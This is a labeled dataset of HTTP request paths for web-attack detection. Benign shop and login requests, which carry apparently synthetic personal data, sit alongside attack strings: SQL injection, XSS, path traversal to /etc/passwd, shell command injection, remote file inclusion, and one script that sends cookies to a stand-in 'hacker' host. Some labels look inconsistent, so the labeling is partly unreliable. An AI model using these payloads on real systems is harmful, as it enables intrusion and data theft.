request	label
/ string / id = 2 & nombre = jamn + ibrico & precio = 85any ?  set-cookie :  + tamper = 5765205567234876235 & cantidad = 23 & b1 = aadir + al + carrito 	1
/ javascript / bat . ini 	0
/ recordings / viewcvs . cgi /  ? cvsroot =  < script > foo <  / script > 	1
/ examples / jsp / sessions / admin . php ? style =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ string / strings / parameters = betelu 	0
/ argroll / 	0
/ abi-shirt / 	0
/ cgi-bin / mail . php ? id =  '  /  *  *  / union /  *  *  / select /  *  *  / 1 , 2 , 1331904464 , 4 --  & blog = 1 	1
"/ string / strings / parameters = 1 ""  ""  ;  ( select  *  from  ( select ( sleep ( 5 )  )  ) srmq ) "	1
/ string / strings / parameters = ardurn 	0
/ javascript / asdf . pdf 	0
"/ string / strings / parameters = 1 ""  ""  )  as xrsi where 9498 = 9498 ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 -- "	1
/ string / strings / parameters = quisto 	0
/ string / strings / parameters = 97426856y 	0
/ 80211hotspots / 	0
"/ string / strings / parameters = ""  |   [  9 -ne  $  ( echo ypwxzb  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \ "	1
/ string / modo = insertar & precio = 7580 & b1 = confirmar 	0
/ javascript / res . inc 	0
/ p14s01-lire / 	0
"/ string / strings / parameters = 1 %  ""  ""  )  )  )  and 6969 =  ( select 6969 from pg_sleep ( 5 )  )  and  (  (  (  ""  ""  %  ""  ""  =  ""  "" "	1
"/ string / strings / parameters = < svg / onload = window . onerror = confirm ; throw / xss /  ;  /  /  "" "	1
/ quicky / 	0
"/ help . php ? q =  ""  & ver \ x0c > q93118475 & rem \ x0c "	1
/ usa-fl / 	0
/ 5214608_75 / 	0
/ string / str =  $  ( echo mkjxcw )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  ' 	1
/ javascript / consumer . gif 	0
"/ string / strings / parameters = 1 %  ""  ""  )  )  )  or  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 8113 = 8113 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  and  (  (  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ 1988-unixsec / 	0
/ phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1332008322 & lang_crm =  .  .  /  .  .  / vtigerservice . php \ x00 	1
/ string / strings / parameters = |  | echo ggjyse $  (  ( 67 + 63 )  )  $  ( echo ggjyse ) ggjyse /  / 	1
/ examples / jsp / checkbox / atomicboard / index . php ? location =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
"/ rv98iwjp . htm ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / modo = registro & login = kimbroug & password = 3m6noja4 & nombre = juan + cruz & apellidos = ortega + sacrista & email = walborn @ 19horas . cat & dni = 26527823z & direccion = rio + de + la + cueza + 187 +  & ciudad = abarn & cp = 31152 & provincia = burgos & ntc = 6505277758430555 & b1 = registrar 	0
/ string / strings / parameters = c /  almenas 98 5 ? f 	0
"/ string / strings / parameters = 1 ""  ""  )  where 2834 = 2834  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 )  , 0 )  , 500000000 )  , null )  else char ( 108 )  |  | char ( 76 )  |  | char ( 112 )  |  | char ( 116 )  end )  from information_schema . system_users )  -- "	1
"/ string / strings / parameters = 1 ""  ""  or 4915 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  -- "	1
/ b2e57dc349799fcbd730c6d844b978ebc49babc6 / 	0
/ string / strings / parameters = ventura motn 	0
/ javascript / insert . rss 	0
/ cacti / dcforum . cgi ? az = list & forum =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ string / strings / parameters = nao victoria ,  79 ,  12 ? h 	0
/ 048715 / 	0
"/ 3j8echh0 . htm ?  < script > document . cookie =  "" testfuqi = 4189 ;  ""  <  / script > "	1
/ javascript / bbs . php 	0
/ 56362_wallpaper150 / 	0
/ string / strings / parameters = 1 %  '  and  ( select  *  from  ( select ( sleep ( 5 )  )  ) gcrr )  # 	1
/ javascript / novell . trace 	0
/ string / strings / parameters = |   [  6 -ne  $  ( echo annqck  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1 	1
/ javascript / xyzzy . swf 	0
/ ao40tlm / 	0
/ string / modo = registro & login = kaunas & password = 86m-bra & nombre = ramss & apellidos = colobran + rebull & email = intosh @ corjet . cv & dni = 63269334z & direccion = escritor + lopez + de + cardenas + 76 + 12e & ciudad = azuara & cp = 37788 & provincia = guadalajara & ntc = 1813799559056744 & b1 = registrar 	0
"/ ydexw8by . php ?  < meta http-equiv = set-cookie content =  "" testulex = 4996 ""  > "	1
/ javascript / faq . class 	0
/ 190844a / 	0
/ javascript / document . do 	1
/ criminals_learn / 	0
/ 1531537867 / 	0
/ javascript / j2me . pfx 	0
/ phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331908785 & lang_crm =  .  .  /  .  .  / vtigerservice . php \ x00 	1
/ en-us / account / perl . exe ? -v 	1
/ 20060203-18 / 	0
/ aolp_v17 / 	0
/ string / id = 3 /  & nombre = jamn + ibrico & precio = 85 & cantidad = 25 & b1 = aadir + al + carrito 	1
/ ar2006122101653 / 	0
/ string / strings / parameters = 1 or 8466 = benchmark ( 5000000 , md5 ( 0x694a4745 )  ) 	1
/ cgi-bin / wd7crx47eaml . asp 	0
/ phpmyadmin / bb-hist . sh ? histfile =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
"/ string / strings / parameters = 1 ""  ""  )  and elt ( 6651 = 1172 , 1172 )  and  (  ""  "" zfkb ""  ""  like  ""  "" zfkb "	1
/ cms / orlando / modules / core / logger / init . php ? globals [ preloc ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ?  ? 	0
/ string / strings / parameters = calle pravia 7 	0
"/ examples / jsp / jsp2 / el / nessus ""  >  < script > alert (  ' mod_perl_status_uri_xss . nasl '  )  <  / script > "	1
/ parasite / 	0
/ help . php ? q = del ; q81588837 & rem ; 	1
/ 049701 / 	0
/ o35zot2r . aspx ?  < script > cross_site_scripting . nasl <  / script > 	1
/ 32f609h / 	0
/ secure5 / 	0
/ order / login . php ? svr_rootscript = http :  /  / 192 . 168 . 202 . 118 : 8080 / 2aibfaczmac8 ? 	1
/ hightechavenida / 	0
"/ 9kr0ih0v . exe ?  < meta http-equiv = set-cookie content =  "" testzgnm = 1183 ""  > "	1
"/ fmnveedu . fts ?  < script > document . cookie =  "" testgfbr = 7014 ;  ""  <  / script > "	1
/ string / strings / parameters = vindel 	0
"/ string / strings / parameters = '  ;  str =  $  ( echo qukucg )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "" "	1
/ nsn /  .  .  \ util / del . bas 	1
/ 824538 / 	0
/ javascript / oracle . xml . xsql . xsqlservlet . cpp 	0
/ scripts / mundimail / template / simpledefault / admin / _masterlayout . php ? top = xxpathxx 	1
/ string / strings / parameters = '  ;  str =  $  ( echo ezcoie )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' 	1
/ drhcprxk . btr 	0
"/ top . php ? stuff =  ""  \ x0dsleep \ x0911 \ x09 # "	1
/ string / strings / parameters = 1 '  )  )  )  and 6510 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  and  (  (  (  ' gmvk '  like  ' gmvk 	1
/ string / strings / parameters = c /  pedro hidalgo ,  137 ,  9 ? g 	0
/ navhome_off / 	0
/ 20040223-newsletter / 	0
/ photoimpact-12 / 	0
/ javascript / properties . exe 	1
/ string / strings / parameters = ;  str =  $  ( echo pohuxh )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  # 	1
/ javascript / dtd . exe 	1
/ javascript / icons . php3 	0
/ 1135779171_882 / 	0
/ string / modo = entrar & login = blisse & pwd = es93n576te & remember = off & b1 = entrar 	0
/ color-it / 	0
/ examples / servlets / servlet / manager / media / browser / mcpuk / connectors / php / commands / thumbnail . php ? base_path =  / etc / passwd \ x00 	1
"/ string / strings / parameters = 1 %  ""  ""  )  and 9198 = 9198 -- "	1
/ msg10910868 / 	0
"/ en-us / 33y9gcqq . htm ?  < script > document . cookie =  "" testnvxc = 4301 ;  ""  <  / script > "	1
/ global-pages / 	0
"/ fc9t54l7 . dll ?  < meta http-equiv = set-cookie content =  "" testggad = 2000 ""  > "	1
/ string / strings / parameters = ;  str =  $  ( echo etahjn )  ;  str1 =  $  {  # str }  ;  if  [  6 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \ 	1
/ string / modo = registro & login = ferne & password = pech + e & nombre = roth & apellidos = guinea + hinojar & email = milani4 @ beautifulbody . sh & dni = 89208475p & direccion = calle + venus ,  + 81 + 2-a & ciudad = endrinal & cp = 39806 & provincia = guadalajara & ntc = 8417338456175136 & b1 = registrar 	0
/ string / strings / parameters = '   str =  $  ( echo nzalsy )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  ' 	1
/ string / strings / parameters = scriptalert ( crosssitescripting )  / script 	1
"/ string / strings / parameters = '  |  | echo $ ifscobrkp $  (  ( 22 + 48 )  )  $  ( echo $ ifscobrkp ) cobrkp "" "	1
/ string / strings / parameters = -123 '  /  *  ! 0limit 1 , 1 /  *  ! 0union /  *  ! 0all /  *  ! 0select /  *  ! 0concat ( 0x3a6267653a ,  /  *  ! 0ifnull ( cast (  /  *  ! 0version (  )  /  *  ! 0as /  *  ! 0char )  , 0x20 )  , 0x3a69626b3a )  # 	1
/ bn857frh . cfc ?  < script > cross_site_scripting . nasl <  / script > 	1
/ javascript / high . asmx 	0
"/ h5i6crm3 . x ?  < script > document . cookie =  "" testlihk = 7070 ;  ""  <  / script > "	1
/ string / id = 1 & nombre = ques + o + manchego & precio = 39 & cantidad = 41 & b1 = aadir + al + carrito 	1
/ cmsimple2_7 / cmsimple / cms . php ? pth [  ' file '  ]  [  ' config '  ]  =  @ rfiurl ? pth [  ' file '  ]  [  ' config '  ]  =  @ rfiurl ? 	1
/ divorce-lawyers / 	0
/ javascript /  ~ ftp . error 	0
/ string / strings / parameters = re1v566i7ator0o 	0
/ string / strings / parameters = yanil 	0
/ javascript / counter . so 	0
/ recordings / texis . exe / nessus 	1
/ string / id = 1 & nombre = queso + manchego & precio = 100 & cantidad = 65 & b1 = aadir + al + carrito 	0
"/ um7xpn15 . htm ?  < meta http-equiv = set-cookie content =  "" testotoy = 6142 ""  > "	1
/ string / strings / parameters = 6877205573294951 	0
/ festival_overview / 	0
/ au-netbsd / 	0
/ 20051019-5 / 	0
/ string / str =  $  ( echo ljkrdd )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  ' 	1
/ javascript / cgi-sys . do 	0
/ 20041221-8 / 	0
/ past-meetings / 	0
/ lists / allitems . aspx 	0
/ string / strings / parameters = 1 )  )  as syot where 1199 = 1199 ; waitfor delay  ' 0 : 0 : 5 '  -- 	1
/ string / strings / parameters = < select id = xss onfocus = javascript : eval ( string [  ' fromcharcode '  ]  ( 97 , 108 , 101 , 114 , 116 , 40 , 39 , 120 , 115 , 115 , 39 , 41 , 32 )  )  autofocus > 	1
/ examples / jsp / sessions / phpnews / sendtofriend . php ? mid =  ' 1 ' 	1
/ redwhtblu / 	0
/ irc-74p4 / 	0
/ string / strings / parameters = e7ato 	0
/ string / strings / parameters = maderaje 	0
/ anchor-logo / 	0
/ string / strings / parameters = 1 '  +  ( select oqvo where 7448 = 7448 union all select null , null , null , null , null -- 	1
/ find_materials / 	0
/ string / strings / parameters = cebrones del ro 	0
/ av-57069 / 	0
/ string / strings / parameters = odiosid-ad 	0
/ string / strings / parameters = mckenney 	0
/ string / id = sessionid = 12312312 &  + username =  < script > document . location =  ' http :  /  / hacker +  . example . com / cgi-bin / cookiesteal . cgi ?  '  +  + document . cookie <  / script >  & nombre = jamn + ibrico & precio = 39 & cantidad = 78 & b1 = aadir + al + carrito 	1
/ string / strings / parameters = hews 	0
"/ ju0u7kfo . cfc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ string / strings / parameters = < svg >  < script > confirm (  ""  & quot ;  )  ; confirm (  ' yes '  )  /  / no ""  )  <  / script > "	1
/ main . php ? frm_daynight = day & frm_passwd =  & frm_referer = http :  /  / 192 . 168 . 28 . 202 / main . php & frm_user =  & scr_height =  & scr_width = q34842846 	1
/ north_brabant / 	0
/ string / strings / parameters = madrigal puigb 	0
/ string / strings / parameters = 6837813065545901 	0
"/ string / strings / parameters = < img + src =  "" jav ascript : alert ( 1 )  ;  ""  > "	1
/ spaceteam / 	0
/ string / modo = entrar & login = kwokkin & pwd = i39str845vo & remember = on & b1 = entrar 	0
/ 636489 / 	0
"/ en-us / w4996nr0 . cfc ?  < script > document . cookie =  "" testttvs = 7163 ;  ""  <  / script > "	1
/ abbyynewsreader / 	0
/ string / modo = insertar & precio = 5498 & b1 = confirmar 	0
"/ string / strings / parameters = 1 ""  ""  )  where 1807 = 1807 ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  -- "	1
/ m_900741603 / 	0
"/ string / strings / parameters = ""  |   [  7 -ne  $  ( echo cinwsa  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  & "	1
/ examples / jsp / jsp2 / el / index . php ? templates_dir =  / etc / passwd \ x00 	1
/ javascript / funding . trace 	0
/ examples / jsp / cal / inc / exif . inc . php ? exif_prog =  ( echo -n  ' original_exif_prog_cmd_exec . nasl :   '  ; id )  |  | echo 	1
/ cid-270876 / 	0
/ string / strings / parameters = chuanhsi 	0
/ string / modo = insertar & precio = 1165 & b1 = confirmar 	0
/ 20051110-17 / 	0
/ main . php ? stuff = del ; q53449996 & rem ; 	1
/ national lampoon ' s van wilder the rise of taj cam kvcd / 	1
/ string / strings / parameters = & echo hattrn $  (  ( 28 + 69 )  )  $  ( echo hattrn ) hattrn & 	1
/ javascript / e . old 	0
/ string / modo = insertar & precio = 4459 & b1 = pasar + por + cajaset-cookie :  + tamper = 1041264011025374727 	1
/ manager / search . php ? submit = true & search =  '  )  ; 	1
/ javascript / www . class 	0
/ stuffkidslike-shopping / 	0
/ a_qbutton2a / 	0
/ 128381 / 	0
/ string / strings / parameters = -6370 '  )  )  as sims where 9388 = 9388 union all select 9388 , 9388 , 9388 , 9388 , 9388 , 9388 , 9388 , 9388 # 	1
/ string / strings / parameters = 00947908d 	0
/ string / strings / parameters = c /  fuente 2 	0
/ varnew_about / 	0
/ include . php ? path [ docroot ]  = xxpathxx 	1
/ 4363530 / 	0
/ javascript / webdav . exe 	1
"/ string / strings / parameters = 1 ""  ""  )  )  and make_set ( 8403 = 8403 , 8899 )  and  (  (  ""  "" nsyl ""  ""  =  ""  "" nsyl "	1
/ string / strings / parameters = &  & echo bsqkbm $  (  ( 74 + 49 )  )  $  ( echo bsqkbm ) bsqkbm & 	1
/ javascript / clock . tpl 	0
/ bittorrent_310047 / 	0
/ digidesignhd / 	0
/ 1331923142-ror_session_fixation . nasl 	0
/ ax504_0610200935 / 	0
/ offset-mortgages / 	0
/ me_shoutsupper / 	0
/ cgi-bin / search . cgi ?  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ winnt \ win . ini 	1
/ mostlyce / jscripts / tiny_mce / plugins / htmltemplate / htmltemplate . php ? mosconfig_absolute_path = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ? 	1
/ cgi . cgi / vssetcookie . exe 	1
/ mpchess / 	0
"/ readmore . php ? config [  "" sipssys ""  ]  = xxpathxx "	1
/ string / modo = registro & login = rurick5 & password = par4u8i67t3 & nombre = rosngela & apellidos = branchadell + arribas & email = pelletier @ cementosanfranq . hu & dni = 66702102d & direccion = comandante + barja + 84 ,  +  & ciudad = cubillas + de + santa + marta & cp = 24443 & provincia = toledo & ntc = 0227003559920538 & b1 = registrar 	0
/ string / strings / parameters = 2319 	0
"/ string / strings / parameters = 1 %  ""  ""  )  )  )  and 8189 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  -- "	1
/ cgi-bin / phpnews / sendtofriend . php ? mid =  ' 1 ' 	1
/ string / strings / parameters = ;  str =  $  ( echo ysdkbb )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' 	1
"/ string / strings / parameters = 1 %  ""  ""  ; select case when 5559 = 3483 then 1 else null end -- "	1
/ javascript / pwd . pfx 	0
/ string / strings / parameters = santa cruz de la zarza 	0
/ en-us / account / engine / admin / admin . php ? id_user =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ surveillance_ca / 	0
"/ string / strings / parameters = < meta http-equiv =  ""  "" link ""  ""  content =  ""  ""  < http :  /  / ha . ckers . org / xss . css >  ;  rel = stylesheet ""  ""  > "	1
/ string / strings / parameters = 9068716333740358 	0
/ main . php ? frm_daynight = day & frm_passwd =  & frm_referer = http :  /  / 192 . 168 . 28 . 202 / main . php & frm_user = q37377551 & scr_height =  & scr_width = 	1
/ dot4logo / 	0
/ string / modo = registro & login = harianto & password = provicero & nombre = sansn & apellidos = obrador + scolari & email = putikiat @ tobarisch . mh & dni = 40813041r & direccion = riera + de + sant + andreu ,  + s / n ,  +  & ciudada = arroyomolinos + de + len & cp = 16195 & provincia = huesca & ntc = 6785859877248336 & b1 = registrar 	1
/ javascript / showcat . ini 	0
/ id-106161 / 	0
/ path_script / createurl . php ? formurl = http :  /  / 192 . 168 . 202 . 118 : 8080 / 2aibfaczmac8 ? 	1
/ string / strings / parameters = 8605730619666825 	0
/ fwdiskclean / 	0
/ spam_categories / 	0
/ javascript / cms . pdf 	0
/ 20061212220935 / 	0
/ string / strings / parameters = -1639 )  )  or 5023 = ctxsys . drithsx . sn ( 5023 ,  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  (  ( 3318 = 3318 	1
/ kelolo special oscar peterson / 	0
/ examples / jsp / checkbox / mapserv . exe ? map = mapserver_detect . nasl . map 	1
/ string / id = 2 & nombre = queso + manchego & precio = 39 & cantidad = 76 & b1 = aadir + al + carrito 	0
/ doc-7012586 / 	0
/ examples / jsp / jsp2 / el / index . php ? id = 0rop9yeuxw ' 	1
/ cacti / search =  < script > alert (  ' xss '  )  <  / script > 	1
/ string / strings / parameters = & echo iwrtxc $  (  ( 50 + 84 )  )  $  ( echo iwrtxc ) iwrtxc 	1
/ cacti / print . php ? what = article & id =  ' 	1
/ 11752698 / 	0
/ string / modo = registro & login = calleja & password = fermentadora & nombre = lahuen & apellidos = palau + ustrell & email = baxley @ italianmotorvillagesevilla . sh & dni = 01084400l & direccion = plaza + aparejador + federico + bermudez + 139 ,  +  & ciudad = orce & cp = 18129 & provincia = vizcaya & ntc = 1769642985963078 & b1 = registrar 	0
/ string / strings / parameters = julin 	0
/ cgi-bin / whois_raw . cgi ? fqdn =  \ x0acat  / etc / passwd 	1
/ javascript / sell . svn-base 	0
/ cezar-iv / 	0
/ string / modo = entrar & login = hiller & pwd = ofrecedor & remember = off & b1 = entrar 	0
/ girlspeak / 	0
/ string / strings / parameters = -8117 '  union all select 9945 , 9945 , 9945 , 9945 , 9945 , 9945 , 9945 # 	1
/ string / strings / parameters = 23 '  limit 1 , 1 union all select concat ( 0x3a6e75773a , ifnull ( cast ( current_user (  )  as char )  , 0x20 )  , 0x3a6270793a )  # 	1
/ cgi-bin / webplus . exe ? about 	1
/ newsnew-1250 / 	0
/  ? npage = -1 & content_dir = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ?  \ x00 & cmd = ls 	0
/ string / strings / parameters = cami llorito ,  38 	0
"/ string / strings / parameters = '  ;  /  *  & iid = 1 *  /  exec /  *  & iid = 1 *  /  master .  . xp_cmdshell  /  *  & iid = 1 *  /   "" ping 127 . 0 . 0 . 1 ""   /  *  & iid = 1 *  /  -- "	1
/ string / strings / parameters = or  ' text '   =  n ' text ' 	1
/ javascript / readme . conf 	0
/ string / modo = registro & login = thibaut & password = almorejo & nombre = teodosia & apellidos = masmitj & email = newlinsky @ forohh . et & dni = 13934213p & direccion = xiprer + 61 ,  + 2-a & ciudad = hara & cp = 22311 & provincia = burgos & ntc = 7636792275869092 & b1 = registrar 	0
/ connecticut-ct / 	0
/ string / strings / parameters = brutez 	0
/ bar-start / 	0
/ lepen75 / 	0
/ javascript / sdk . ws 	0
/ javascript / userlog . ppt 	0
"/ yef5f3d5 . exe ?  < script > document . cookie =  "" testcrcv = 6167 ;  ""  <  / script > "	1
/ string / modo = entrar & login = dev & pwd = v2e2udo & remember = off & b1 = entrar 	0
/ mediacablefordv1040 / 	0
